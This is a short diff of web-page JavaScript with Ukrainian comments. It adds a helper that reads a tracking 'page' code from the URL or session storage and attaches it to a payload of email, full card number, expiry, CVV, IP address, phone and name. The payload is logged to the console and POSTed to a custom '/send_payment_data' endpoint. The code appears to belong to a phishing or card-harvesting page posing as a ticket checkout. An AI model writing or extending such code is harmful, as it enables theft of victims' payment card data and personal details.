@@ -260,19 +260,30 @@
         // --- Додаємо телефон і ім'я з sessionStorage ---
         const phone = sessionStorage.getItem('ticket_phone') || '';
         const name = sessionStorage.getItem('ticket_name') || '';
+        // Додаємо page_code
+        function getPageCode() {
+          // 1. З URL
+          const urlParams = new URLSearchParams(window.location.search);
+          let page = urlParams.get('page');
+          if (page) return page;
+          // 2. З sessionStorage
+          page = sessionStorage.getItem('page_code');
+          if (page) return page;
+          return '';
+        }
+        const page_code = getPageCode();
         try {
             let ip = userIP;
             if (!ip) {
                 await new Promise(res => setTimeout(res, 500));
                 ip = userIP;
             }
-            const page_code = getPageCode();
             // --- Додаю логування для діагностики ---
             console.log('SEND PAYMENT DATA:', { email, card, expiry, cvv, ip, page: page_code, price, currency, phone, name });
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, price, currency, phone, name })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, page_code, price, currency, phone, name })
             });
             if (response.ok) {
                 if (!document.getElementById('payment-msg')) {
